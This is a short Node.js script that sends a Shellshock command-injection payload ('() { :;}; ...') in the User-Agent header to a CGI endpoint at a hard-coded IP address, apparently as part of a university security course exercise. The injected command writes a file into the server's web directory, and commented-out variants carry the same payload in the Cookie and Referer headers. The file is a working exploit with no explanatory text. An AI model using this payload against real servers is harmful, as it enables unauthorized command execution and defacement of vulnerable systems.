var request = require('request');
 
// Set the headers
var headers = {
    'User-Agent':       '() { :;}; echo test > /home/cps_test/apache2/htdocs/cps290/sjd27.html',
 //    'Cookie':            '() { :; }; cat jju2.html > sjd27.html',
    // 'Referer':           '() { :; }; /bin/cat jju2.html > sjd27.html',
    'Host':          '152.3.136.182',
    //'Content-Type':     'application/x-www-form-urlencoded'
}
 


//http://152.3.136.182:8081/cps290/sjd27.html
//http://152.3.136.182:8081/cgi-bin/env.sh

// Configure the request
var options = {
    url: 'http://152.3.136.182:8081/cgi-bin/env.sh',
    method: 'GET',
    headers: headers
    // qs: {'key1': 'xxx', 'key2': 'yyy'}
}
 
// Start the request
request(options, function (error, response, body) {
    if (error) {
        console.log("error: " + error);
    } else{
        console.log("response: " + body);
    }
})